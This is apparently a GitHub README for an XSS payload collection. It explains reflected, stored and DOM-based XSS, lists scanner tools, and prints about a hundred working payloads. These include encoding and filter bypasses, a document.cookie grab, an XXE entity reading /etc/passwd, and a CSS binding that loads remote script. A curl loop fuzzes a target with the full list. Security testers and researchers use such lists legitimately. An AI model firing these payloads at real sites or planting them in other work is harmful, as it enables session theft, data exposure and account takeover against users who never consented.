# 💉 XSS Payload Arsenal

<p align="center">
  <img src="https://img.shields.io/badge/Security-XSS%20Research-red?style=for-the-badge&logo=security&logoColor=white" alt="Security">
  <img src="https://img.shields.io/badge/Type-Payload%20List-orange?style=for-the-badge" alt="Type">
  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/OWASP-Top%2010-darkred?style=for-the-badge" alt="OWASP">
</p>

<p align="center">
  A comprehensive, curated collection of Cross-Site Scripting (XSS) vulnerability payloads for security researchers, penetration testers, and bug bounty hunters.
</p>

---

## ⚠️ Disclaimer

> This repository is intended **strictly for educational purposes and authorized security testing only**.  
> Unauthorized use of these payloads against systems you do not own or have explicit permission to test is **illegal and unethical**.  
> The author assumes **no responsibility** for any misuse of the information provided.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [What is XSS?](#-what-is-xss)
- [XSS Types](#-xss-types)
- [Vulnerability Scanner Tools](#-vulnerability-scanner-tools)
- [Payload List](#-payload-list)
- [References](#-references)
- [Recommended Books](#-recommended-books)
- [Getting Started](#-getting-started)
- [Contributing](#-contributing)
- [Support](#-support)

---

## 🔍 Overview

Cross-Site Scripting (XSS) remains one of the most prevalent and dangerous web vulnerabilities, consistently appearing in the **OWASP Top 10**. This repository provides an extensive payload list to assist security professionals in:

- **Penetration testing** web applications
- **Bug bounty hunting** on authorized platforms
- **CTF (Capture The Flag)** challenges
- **Security awareness training** and research

---

## 🧠 What is XSS?

Cross-Site Scripting (XSS) is a type of **injection attack** where malicious scripts are injected into otherwise benign and trusted websites.

XSS attacks occur when an attacker uses a web application to send malicious code — typically in the form of a browser-side script — to a different end user. The victim's browser has no way to determine that the script should not be trusted and will execute it.

Because the browser believes the script originates from a trusted source, the malicious script can:

- Access **cookies** and **session tokens**
- Exfiltrate **sensitive user data**
- Rewrite the **HTML content** of the page
- Perform actions **on behalf of the user**

---

## 🗂️ XSS Types

| Type | Description |
|------|-------------|
| **Reflected XSS** | Payload is embedded in a URL and reflected off the server in an error message, search result, or any other response including user-supplied input |
| **Stored XSS** | Payload is permanently stored on the target server (e.g., database, message forum, comment field) and later retrieved by victims |
| **DOM-based XSS** | Payload is executed as a result of modifying the DOM environment in the victim's browser, with the client-side script itself writing data to the DOM |

---

## 🛠️ Vulnerability Scanner Tools

The following tools can be used to detect and exploit XSS vulnerabilities in authorized testing environments:

| Tool | Type | Description |
|------|------|-------------|
| [XSStrike](https://github.com/UltimateHackers/XSStrike) | CLI | Advanced XSS detection suite with fuzzing engine |
| [BruteXSS Terminal](https://github.com/shawarkhanethicalhacker/BruteXSS) | CLI | Terminal-based brute force XSS scanner |
| [BruteXSS GUI](https://github.com/rajeshmajumdar/BruteXSS) | GUI | Graphical interface version of BruteXSS |
| [XSS Scanner Online](http://xss-scanner.com/) | Web | Online XSS vulnerability scanner |
| [XSSer](https://tools.kali.org/web-applications/xsser) | CLI | Kali Linux automated XSS framework |
| [xsscrapy](https://github.com/DanMcInerney/xsscrapy) | CLI | XSS spider — finds 85%+ of XSS vulnerabilities |
| [Cyclops](https://github.com/v8blink/Chromium-based-XSS-Taint-Tracking) | Framework | Chromium-based XSS taint tracking engine |

---

## 🧪 Payload List

The payloads below cover a wide range of XSS injection techniques including:

- **Basic script injections**
- **Event handler-based payloads** (`onload`, `onerror`, `onclick`, etc.)
- **HTML attribute injections**
- **Encoded & obfuscated payloads** (URL, hex, Unicode, HTML entity encoding)
- **Filter bypass techniques**
- **SVG/XML-based vectors**
- **DOM-clobbering payloads**

```html
<!-- ============================================================ -->
<!--  Project : XSS Payload Arsenal                               -->
<!--  Author  : R.S.Nithesh                                       -->
<!--  GitHub  : https://github.com/R-S-Nithesh/                   -->
<!-- ============================================================ -->

"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
<image/src/onerror=prompt(8)>
<img/src/onerror=prompt(8)>
<image src/onerror=prompt(8)>
<img src/onerror=prompt(8)>
<image src =q onerror=prompt(8)>
<img src =q onerror=prompt(8)>
</scrip</script>t><img src =q onerror=prompt(8)>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<script>alert('XSS')</script>
%3cscript%3ealert('XSS')%3c/script%3e
%22%3e%3cscript%3ealert('XSS')%3c/script%3e
%253cscript%253ealert(1)%253c/script%253e
<img src=xss onerror=alert(1)>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<SCRIPT>String.fromCharCode(97,108,101,114,116,40,49,41)</SCRIPT>
<scr<script>ipt>alert(1)</scr</script>ipt>
foo<script>alert(1)</script>
"><s"%2b"cript>alert(document.cookie)</script>
<marquee onstart='javascript:alert("1");'>=(◕_◕)=
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
'';!--"<XSS>=&{()}
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<~/XSS STYLE=xss:expression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
">"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
';alert(String.fromCharCode(88,83,83))//
<div style="binding: url(http://www.example.com/xss.js);">
```

> 📄 The full payload list (2,600+ entries) is available in [`xss-payload-list.txt`](./xss-payload-list.txt)

---

## 📚 References

### Cross-Site Scripting (XSS) — OWASP

| Topic | Link |
|-------|------|
| XSS Overview | [OWASP: Cross-site Scripting](https://owasp.org/www-community/attacks/xss/) |
| XSS Prevention Cheat Sheet | [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| DOM-based XSS Prevention | [OWASP: DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) |
| Testing for Reflected XSS | [OWASP: OTG-INPVAL-001](https://owasp.org/www-project-web-security-testing-guide/) |
| Testing for Stored XSS | [OWASP: OTG-INPVAL-002](https://owasp.org/www-project-web-security-testing-guide/) |
| Testing for DOM-based XSS | [OWASP: OTG-CLIENT-001](https://owasp.org/www-project-web-security-testing-guide/) |
| DOM Based XSS | [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) |
| Veracode XSS Cheat Sheet | [Veracode: XSS](https://www.veracode.com/security/xss) |

---

## 📗 Recommended Books

| Book | Description |
|------|-------------|
| [XSS Attacks: Cross-site Scripting Exploits and Defense](https://books.google.com.tr/books/about/XSS_Attacks.html?id=dPhqDe0WHZ8C) | Comprehensive guide to XSS exploits and defensive strategies |
| [XSS Cheat Sheet (LeanPub)](https://leanpub.com/xss) | Concise, practical XSS reference for pentesters |

---

## 🚀 Getting Started

### Clone via HTTPS

```bash
git clone https://github.com/R-S-Nithesh/xss-payload-arsenal.git
```

### Clone via SSH

```bash
git clone git@github.com:R-S-Nithesh/xss-payload-arsenal.git
```

### Usage Example

Use the payload list with your preferred security tool. For example, with `curl` for quick testing on an authorized target:

```bash
while IFS= read -r payload; do
  curl -s "https://target.example.com/search?q=${payload}" | grep -q "alert" && echo "[VULNERABLE] $payload"
done < xss-payload-list.txt
```

> ⚠️ Only run against systems you are authorized to test.

---

## 🤝 Contributing

Contributions are welcome! If you have new payloads, bypass techniques, or improvements:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/new-payloads`)
3. Commit your changes (`git commit -m 'Add new filter bypass payloads'`)
4. Push to the branch (`git push origin feature/new-payloads`)
5. Open a Pull Request

Please ensure all contributions adhere to responsible disclosure principles.

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---